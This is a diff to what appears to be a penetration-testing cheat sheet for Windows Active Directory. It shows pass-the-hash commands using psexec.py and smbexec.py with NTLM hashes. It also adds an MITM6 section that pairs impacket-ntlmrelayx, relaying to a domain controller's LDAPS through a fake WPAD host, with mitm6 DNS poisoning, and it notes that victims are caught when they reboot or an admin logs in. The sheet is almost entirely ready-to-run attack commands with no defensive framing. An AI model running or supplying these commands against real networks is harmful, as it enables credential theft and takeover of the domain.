@@ -77,3 +77,18 @@ psexec.py <user>@<ip>--hashes [LM-HASH]:[NTLM-HASH]
 psexec.py <user>@<ip> --hashes [LM-HASH]:[NTLM-HASH]
 smbexec.py <user>@<ip> --hashes [LM-HASH]:[NTLM-HASH]
 ```
+
+## MITM6
+
+```
+impacket-ntlmrelayx -6 -t ldaps://<IP_DC> -wh fakewpad.<dc>.local -l lootme
+
+```
+
+parallely run
+
+```
+sudo mitm6 -d <dc>.local
+```
+
+victime trapped by rebooting computer or login to the machine as an DC admin
